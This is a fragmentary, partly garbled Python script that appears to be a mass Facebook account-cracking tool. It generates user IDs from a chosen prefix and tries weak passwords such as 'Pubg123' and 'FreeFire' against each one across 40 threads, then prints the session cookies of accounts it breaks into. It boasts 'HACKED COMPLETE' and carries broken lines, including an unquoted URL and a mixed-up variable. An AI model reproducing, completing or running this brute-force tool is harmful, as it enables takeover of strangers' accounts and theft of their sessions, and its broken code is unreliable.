...
for ua in range(10000):
	...
	ugen.append(alhhaj)
os.system("xdg-open https://github.com/safwan
welcome to dark hacker
Fuck up
9:30
    print("")
    Jaber = input(f'\033[1;32m    :\033[1;36m ')
    if Jaber in ["1","A"]:
        Jabers()
    if Jaber in ["2","B"]:
        os.system(https://www.facebook.com/fahimfardouse?mibextid=ZbWKwL)
    if Jaber in ["3","C"]:
        os.system('')
    if Jaber in ["0","X"]:
        os.system('exit')
...
def Jabers():
    ...
    print(logo)
    print("\033[1;91m��������������������������������������������ͻ")
    print("\033[1;31m�\033[1;36m     : \033[1;31m[\033[1;32m016\033[1;31m] [\033[1;32m017\033[1;31m] [\033[1;32m018\033[1;31m] [\033[1;32m019\033[1;31m] \033[1;31m  �")
    print("\033[1;91m��������������������������������������������ͼ")
    code = input('\033[1;32m    :\033[1;36m ')
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
    print(logo)
    print("\033[1;91m��������������������������������������������ͻ")
    print("\033[1;31m�\033[1;36m     : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m10000\033[1;31m] \033[1;31m �")
    print("\033[1;91m��������������������������������������������ͼ")
    limit=int(input("\033[1;32m    :\033[1;36m "))
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        tl = str(len(user))
        print("\033[1;91m�������������������������������������ͻ")
        print(f'\033[1;91m�\033[1;92m    : '+code) 
        print(f'\033[1;91m�\033[1;92m    : '+tl)
        print(f'\033[1;91m�\033[1;92m MACK BY SAFWAN ')
        print("\033[1;91m�������������������������������������ͼ")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
            uid = code+Fuck
            Fb_crack.submit(Fuck,uid,pwx,tl)
    print("\033[1;91m���������������������������ͻ")
    print(' \033[1;91m[\033[1;92m\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m\033[1;91m]\033[1;92m HI IM SAFWAN ')
    print("\033[1;91m���������������������������ͼ")
...
def Fuck(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;91m[\033[1;92m SAFWAN \033[1;91m][\033[1;92m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
...
pro}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\033[1;36m : \033[1;35m'+coki)
